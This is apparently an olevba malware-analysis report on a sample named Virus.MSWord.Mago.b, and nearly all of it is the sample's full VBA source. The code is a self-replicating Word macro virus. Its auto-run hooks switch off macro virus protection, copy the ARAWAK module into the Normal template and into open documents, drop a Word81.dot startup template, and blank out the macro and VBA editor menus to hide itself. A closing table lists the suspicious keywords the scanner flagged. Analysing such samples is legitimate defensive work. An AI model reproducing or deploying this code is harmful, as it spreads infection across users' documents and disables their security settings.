olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mago.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mago.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ARAWAK.bas 
in file: Virus.MSWord.Mago.b - OLE stream: 'Macros/VBA/ARAWAK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
On Error Resume Next
Application.VBE.ActiveVBProject.VBComponents.Item("ARAWAK").Export "c:\magrip.sys"
Call Ekeko
If UCase(Dir(Application.StartupPath & "\Word81.dot")) <> "WORD81.DOT" Then
Documents.Add Template:="", NewTemplate:=False
Open "c:\ARAWAK2.sys" For Output As 1
Print #1, "Attribute VB_Name = ""ARAWAK2"""
Print #1, "Sub FileSave()"
Print #1, "On Error Resume Next"
Print #1, "If NormalTemplate.VBProject.VBComponents.Item(""ARAWAK"").Name <> ""ARAWAK"" Then"
Print #1, "NormalTemplate.VBProject.VBComponents.Import ""c:\magrip.sys"""
Print #1, "End If"
Print #1, "ActiveDocument.Save"
Print #1, "End Sub"
Close 1
ActiveDocument.VBProject.VBComponents.Import "c:\ARAWAK2.sys"
ActiveDocument.SaveAs FileName:=Application.StartupPath & "\Word81.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
Windows("Word81.dot").Close
End If
End Sub

Sub AutoOpen()
Dim Set1 As Long
On Error Resume Next
Set1 = &H0
Options.VirusProtection = False
System.ProfileString("Options", "EnableMacroVirusProtection") = "0"
Application.VBE.ActiveVBProject.VBComponents.Item("ARAWAK").Export "c:\magrip.sys"
Call Ekeko
End Sub

Sub tutu()
Dim Set1 As Long
Dim WN, WD As Boolean
On Error Resume Next
Set1 = &H0
Options.VirusProtection = False
System.ProfileString("Options", "EnableMacroVirusProtection") = "0"
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
Application.VBE.ActiveVBProject.VBComponents.Item("ARAWAK").Export "c:\magrip.sys"
WD = True
WN = True
If UCase(NormalTemplate.VBProject.VBComponents.Item("ARAWAK").Name) <> "ARAWAK" Then
WN = False
End If
If UCase(ActiveDocument.VBProject.VBComponents.Item("ARAWAK").Name) <> "ARAWAK" Then
WD = False
End If
If WN = False Then
NormalTemplate.VBProject.VBComponents.Import "c:\magrip.sys"
NormalTemplate.Save
End If
If WD = False Then
ActiveDocument.VBProject.VBComponents.Import "c:\magrip.sys"
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
Call Ekeko
End Sub
Sub AutoExit()
On Error Resume Next
Application.VBE.ActiveVBProject.VBComponents.Item("ARAWAK").Export "c:\magrip.sys"
Call tutu
Call AutoExec
End Sub
Sub FileSave()
On Error Resume Next
Application.VBE.ActiveVBProject.VBComponents.Item("ARAWAK").Export "c:\magrip.sys"
Call tutu
Call AutoExec
ActiveDocument.Save
End Sub
Sub AutoClose()
On Error Resume Next
Application.VBE.ActiveVBProject.VBComponents.Item("ARAWAK").Export "c:\magrip.sys"
Call tutu
Call AutoExec
End Sub
Sub Ekeko()
Yin = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Yin < 4 Then
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString "Sub ToolsMacro()" & vbCr & "End Sub" & vbCr & "Sub FileTemplates()" & vbCr & "End Sub" & vbCr & "Sub ViewVBCode()" & vbCr & "End Sub"
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

